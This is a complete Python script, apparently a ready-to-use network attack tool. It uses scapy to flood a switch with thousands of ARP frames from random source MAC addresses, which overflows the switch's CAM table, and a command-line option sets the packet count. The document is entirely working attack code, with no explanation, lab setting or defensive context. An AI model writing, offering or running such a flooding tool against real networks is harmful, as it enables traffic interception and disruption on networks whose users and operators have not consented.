from scapy.all import *
import click

@click.command()
@click.option('--nb-packets', default=16000, help="Number of packet to send to this CAM.")
@click.option('--verbose', default=True, help="Should the verbosity be activated ?")
def main(nb_packets, verbose):
    cpt = 0
    while cpt <= nb_packets:
        packet = Ether(src=rand_mac())/ARP()
        sendp(packet, verbose=0)
        if verbose: print(cpt)
        cpt += 1

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

if __name__ == '__main__':
    main()
